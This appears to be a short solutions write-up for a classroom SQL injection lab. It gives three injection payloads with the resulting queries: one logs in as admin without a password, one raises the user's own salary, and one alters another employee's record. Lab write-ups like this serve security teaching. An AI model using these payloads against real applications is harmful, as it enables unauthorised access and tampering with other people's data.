# SQL Injection solutions

## Task 1 - Logging without credentials

Writing in the `user` form the expression `admin';#`

```sql
SELECT * FROM credential WHERE Name='admin';
```
you will log in as administrator.

## Task 2 - Changing your salary

Writing in one of the edit profile boxes, e.g., Nickname, `',salary = '999999` the query will be:

```sql
UPDATE credential SET nickname='', salary='999999',email='$input_email',address='$input_address',Password='$hashed_pwd',PhoneNumber='$input_phonenumber' 
    WHERE ID=$id;
```

## Task 3 - Changing Boby salary

Writing in one of the edit profile boxes `', salary=1 WHERE Name='Boby';#` the query will be:

```sql
UPDATE credential SET nickname='', salary=1 WHERE Name='Boby';
```

commenting the rest out.